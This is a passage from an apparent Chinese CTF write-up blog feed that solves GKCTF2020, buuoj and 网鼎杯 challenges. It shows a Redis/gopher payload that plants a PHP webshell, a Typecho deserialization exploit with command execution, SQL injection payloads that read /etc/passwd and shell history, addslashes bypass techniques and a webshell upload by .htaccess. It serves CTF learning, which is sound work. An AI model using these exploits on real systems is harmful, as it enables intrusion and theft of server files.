class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><p>跑出来的打上去，再访问shell.php即可getflag</p><h4 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h4><p>下载源码，找到利用的点，在start</p><img src="/2020/05/24/GKCTF/7.png" class="" title="examplename"><p>typecho反序列化，google一下，找到exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">"RSS 2.0"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"title"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">                <span class="string">"link"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">                <span class="string">"data"</span> =&gt; <span class="string">"20190430"</span>,</span><br><span class="line">                <span class="string">"author"</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"screenName"</span> =&gt; <span class="string">"eval('system(\'cat /flag\');exit;')"</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"adapter"</span> =&gt; $a,</span><br><span class="line">    <span class="string">"prefix"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjM1OiJldmFsKCdzeXN0ZW0oXCdjYXQgL2ZsYWdcJyk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==</span></span><br></pre></td></tr></table></figure><p>直接打cookie过去或者post，改一下referer，getflag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e(x)=<span class="number">11</span>x+<span class="number">6</span>(mod26)</span><br><span class="line">密文：welcylk</span><br></pre></td></tr></table></figure><p>仿射密码，直接脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line">s = input(<span class="string">"请输入解密字符："</span>).upper()</span><br><span class="line">a = int(input(<span class="string">"请输入a："</span>))</span><br><span class="line">b = int(input(<span class="string">"请输入b："</span>))</span><br><span class="line"><span class="comment">#求a关于26的乘法逆元</span></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span class="number">65</span>)</span><br><span class="line">    print(res, end=<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#sorcery（解密字符）</span></span><br></pre></td></tr></table></figure><p>sorcery用base64加密包上flag即可</p><h4 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="[GKCTF2020]汉字的秘密"></a>[GKCTF2020]汉字的秘密</h4><p>当铺密码+ascii转字符</p><p>字符挨个+下标位置即为flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;p&gt;前言：&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="GK！！" scheme="http://yoursite.com/tags/GK%EF%BC%81%EF%BC%81/"/>
    
  </entry>
  
  <entry>
    <title>buuoj3</title>
    <link href="http://yoursite.com/2020/05/16/buuoj3/"/>
    <id>http://yoursite.com/2020/05/16/buuoj3/</id>
    <published>2020-05-16T14:34:22.000Z</published>
    <updated>2020-05-25T16:12:12.315Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#0X01：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="0X01：[网鼎杯 2020 青龙组]AreUSerialz"></a>0X01：[网鼎杯 2020 青龙组]AreUSerialz<a id="more"></a></h4><p>这道题当天比赛的时候就大概看了一下，现在buu上复现了发现也不是很难，来看看吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化，对传入的str参数进行反序列化，字符的ASCII都要在32~125之间</p><p>反序列化会调用__destruct析构方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从代码中可以看到，===是强比较，也就是说字符值和类型都要相同，如果不同就进入process()函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从这可以看到，我们想要读取文件，那么op的值要为2，刚好这里是用的若比较，直接让op=2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       $res = <span class="string">""</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">           $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>read函数中的filename是可控的，赋值为flag.php，再以output函数输出</p><p>这里有个问题，protect对象序列化时会有%00,%00对应的ascii值为0不在那个范围内，找资料发现php7.1对于属性类型不敏感，改为public</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure><p>给str传入序列化数据，在源码处找到flag</p><h4 id="0X02：-网鼎杯-2018-Comment"><a href="#0X02：-网鼎杯-2018-Comment" class="headerlink" title="0X02：[网鼎杯 2018]Comment"></a>0X02：[网鼎杯 2018]Comment</h4><p>打开是一个留言板界面，F12找到提示：程序员GIT写一半跑路了,都没来得及Commit :)</p><p>用githack找到文件，但是只显示了一部分，看了wp，用的wyh师傅的githack可以恢复，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);<span class="comment">//第一次过滤</span></span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',//未过滤直接用</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>addslashes绕过方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">设置数据库字符为gbk导致宽字节注入</span><br><span class="line">使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入</span><br><span class="line">url解码导致绕过addslashes</span><br><span class="line">base64解码导致绕过addslashes</span><br><span class="line">json编码导致绕过addslashes</span><br><span class="line">没有使用引号保护字符串，直接无视addslashes</span><br><span class="line">使用了stripslashes(去掉了\)</span><br><span class="line">字符替换导致的绕过addslashes</span><br></pre></td></tr></table></figure><p>category只过=过滤了一次，二次注入</p><p>尝试发帖，要登录，账号密码告知，密码后三位需要爆破，爆破出666</p><p>这里用/**/来注释</p><p>123’,content=user(),/*,评论中写*/#就闭合了语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'123'</span>,<span class="keyword">content</span>=<span class="keyword">user</span>(),<span class="comment">/*',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="comment">#',</span></span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>下面直接给payload，就不多说了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">',content=(<span class="keyword">select</span>( <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>))),<span class="comment">/*</span></span><br><span class="line"><span class="comment">',content=(select(load_file("/home/www/.bash_history"))),/*</span></span><br><span class="line"><span class="comment">',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*/</span>/发现长度不够改为<span class="keyword">hex</span>读取</span><br><span class="line"><span class="string">',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/1.png" class="" title="examplename"><h4 id="0X03：-GXYCTF2019-BabyUpload"><a href="#0X03：-GXYCTF2019-BabyUpload" class="headerlink" title="0X03：[GXYCTF2019]BabyUpload"></a>0X03：[GXYCTF2019]BabyUpload</h4><p>文件上传，直接上马先试试</p><p>发现jpg文件直接上传成功了，用蚁剑连接，发现不行</p><p>改用png失败</p><p>经过尝试发现.htaccess在改了content-type之后能上传！</p><img src="/2020/05/16/buuoj3/3.png" class="" title="examplename"><img src="/2020/05/16/buuoj3/2.png" class="" 